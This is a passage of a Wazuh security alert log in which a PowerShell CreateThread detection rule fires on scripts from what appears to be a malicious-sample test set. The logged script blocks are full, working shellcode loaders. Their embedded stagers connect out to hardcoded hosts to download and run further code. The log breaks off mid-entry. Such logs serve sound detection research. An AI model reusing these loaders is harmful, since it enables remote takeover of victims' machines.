0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x05,0xca,0x79,0x85,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 7485bb0e-d3bd-4276-a101-6aa5820640e1\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1672.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x05,0xca,0x79,0x85,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"7485bb0e-d3bd-4276-a101-6aa5820640e1","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1672.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:49.680+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":66,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304329.2234596","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:10.3531074Z","eventRecordID":"144956","processID":"8992","threadID":"4444","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$L8Q = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $L8Q -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x46,0x20,0x9b,0xa4,0xdb,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xc2,0x04,0x03,0x42,0x49,0xc2,0x6e,0x58,0xbd,0x80,0x91,0xa1,0x3d,0xe5,0x18,0x44,0x0c,0x25,0x7e,0x0c,0x3e,0x95,0xf4,0x40,0xb2,0x5e,0x58,0x71,0x41,0x12,0x75,0x76,0xe2,0x99,0xa3,0xb9,0xf3,0xb2,0x90,0xd8,0x77,0xc9,0xc4,0x3a,0x46,0x02,0x19,0x3a,0x8f,0x7f,0xd0,0x6e,0x58,0x0b,0x47,0x9f,0xed,0x41,0x54,0x14,0xbd,0x44,0xdc,0xc9,0x75,0x66,0xcd,0x5f,0x0e,0x31,0xcd,0x5e,0xc3,0x49,0x44,0x79,0x00,0x77,0x1e,0xf2,0xf2,0x03,0xa1,0xd2,0xcb,0xec,0x0e,0x1b,0xe4,0x1e,0x4e,0x5b,0xc2,0xc0,0x25,0x95,0x31,0x7c,0x3e,0x62,0x48,0x5a,0xcb,0x71,0xea,0x29,0x6b,0x5e,0x0b,0xfd,0xea,0x15,0x07,0x4a,0x78,0x71,0x0b,0x4d,0xad,0x09,0x37,0xc6,0x50,0xde,0xbe,0x9c,0x76,0xfa,0x9b,0x47,0x16,0x5b,0x41,0x29,0x27,0xbb,0x2a,0x96,0x8d,0xb7,0xc6,0xc3,0xbf,0x95,0x8e,0x20,0xf2,0x25,0x4e,0x2f,0x85,0x56,0x7c,0xf0,0x3d,0xf1,0xcc,0x79,0x98,0x06,0x33,0x50,0x5c,0x98,0xca,0x5b,0x9d,0xb0,0x08,0x0f,0xcd,0xaa,0xb9,0x30,0x86,0x2a,0x46,0xe5,0x33,0x2e,0xd0,0x9c,0xa5,0x0a,0x29,0xc9,0x27,0x6b,0x38,0x55,0xa1,0x8d,0x6a,0x35,0xe1,0x01,0xca,0xe5,0x41,0xf2,0xa2,0xef,0x4d,0x2d,0xd2,0x0f,0x84,0x46,0x78,0xe0,0x71,0x3e,0x14,0x99,0xdb,0xb4,0x85,0x66,0xf6,0xb0,0x85,0xed,0xf5,0x45,0x4b,0x06,0x73,0x56,0x3b,0xe6,0xce,0x04,0xed,0xf9,0xe4,0x23,0x11,0x6c,0x03,0xe2,0x46,0x18,0x09,0xd3,0xa0,0x87,0xf2,0x36,0xbb,0x0e,0x67,0xf9,0xd3,0x6e,0x67,0xf9,0x23,0x39,0xed,0xf9,0x4b,0x9d,0x55,0xaa,0x6e,0xe2,0x43,0xde,0x23,0x77,0x6c,0xb7,0x90,0xd0,0x04,0x35,0xcf,0x17,0x8b,0xc6,0x3a,0xa6,0xf7,0x10,0x02,0xdc,0x19,0xa1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ktN=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ktN.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ktN,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 392bb8cd-aa3a-4bdf-87d2-74a997be1207\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1678.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$L8Q = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $L8Q -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x46,0x20,0x9b,0xa4,0xdb,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xc2,0x04,0x03,0x42,0x49,0xc2,0x6e,0x58,0xbd,0x80,0x91,0xa1,0x3d,0xe5,0x18,0x44,0x0c,0x25,0x7e,0x0c,0x3e,0x95,0xf4,0x40,0xb2,0x5e,0x58,0x71,0x41,0x12,0x75,0x76,0xe2,0x99,0xa3,0xb9,0xf3,0xb2,0x90,0xd8,0x77,0xc9,0xc4,0x3a,0x46,0x02,0x19,0x3a,0x8f,0x7f,0xd0,0x6e,0x58,0x0b,0x47,0x9f,0xed,0x41,0x54,0x14,0xbd,0x44,0xdc,0xc9,0x75,0x66,0xcd,0x5f,0x0e,0x31,0xcd,0x5e,0xc3,0x49,0x44,0x79,0x00,0x77,0x1e,0xf2,0xf2,0x03,0xa1,0xd2,0xcb,0xec,0x0e,0x1b,0xe4,0x1e,0x4e,0x5b,0xc2,0xc0,0x25,0x95,0x31,0x7c,0x3e,0x62,0x48,0x5a,0xcb,0x71,0xea,0x29,0x6b,0x5e,0x0b,0xfd,0xea,0x15,0x07,0x4a,0x78,0x71,0x0b,0x4d,0xad,0x09,0x37,0xc6,0x50,0xde,0xbe,0x9c,0x76,0xfa,0x9b,0x47,0x16,0x5b,0x41,0x29,0x27,0xbb,0x2a,0x96,0x8d,0xb7,0xc6,0xc3,0xbf,0x95,0x8e,0x20,0xf2,0x25,0x4e,0x2f,0x85,0x56,0x7c,0xf0,0x3d,0xf1,0xcc,0x79,0x98,0x06,0x33,0x50,0x5c,0x98,0xca,0x5b,0x9d,0xb0,0x08,0x0f,0xcd,0xaa,0xb9,0x30,0x86,0x2a,0x46,0xe5,0x33,0x2e,0xd0,0x9c,0xa5,0x0a,0x29,0xc9,0x27,0x6b,0x38,0x55,0xa1,0x8d,0x6a,0x35,0xe1,0x01,0xca,0xe5,0x41,0xf2,0xa2,0xef,0x4d,0x2d,0xd2,0x0f,0x84,0x46,0x78,0xe0,0x71,0x3e,0x14,0x99,0xdb,0xb4,0x85,0x66,0xf6,0xb0,0x85,0xed,0xf5,0x45,0x4b,0x06,0x73,0x56,0x3b,0xe6,0xce,0x04,0xed,0xf9,0xe4,0x23,0x11,0x6c,0x03,0xe2,0x46,0x18,0x09,0xd3,0xa0,0x87,0xf2,0x36,0xbb,0x0e,0x67,0xf9,0xd3,0x6e,0x67,0xf9,0x23,0x39,0xed,0xf9,0x4b,0x9d,0x55,0xaa,0x6e,0xe2,0x43,0xde,0x23,0x77,0x6c,0xb7,0x90,0xd0,0x04,0x35,0xcf,0x17,0x8b,0xc6,0x3a,0xa6,0xf7,0x10,0x02,0xdc,0x19,0xa1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ktN=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ktN.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ktN,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"392bb8cd-aa3a-4bdf-87d2-74a997be1207","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1678.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:51.269+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":67,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304331.2245945","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:11.2056539Z","eventRecordID":"144960","processID":"9192","threadID":"4284","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x53,0x85,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: c604f17e-6978-4791-a552-4cd84f84a9e2\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1681.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x53,0x85,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"c604f17e-6978-4791-a552-4cd84f84a9e2","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1681.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:52.209+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":68,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304332.2256894","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:12.0119145Z","eventRecordID":"144964","processID":"2676","threadID":"8428","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$Yiu = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Yiu -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc5,0x1c,0x4d,0x4b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$t8d=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($t8d.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$t8d,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 114754ca-ccd3-4ed7-8f8f-dd5a9ad1be79\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1690.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$Yiu = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Yiu -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 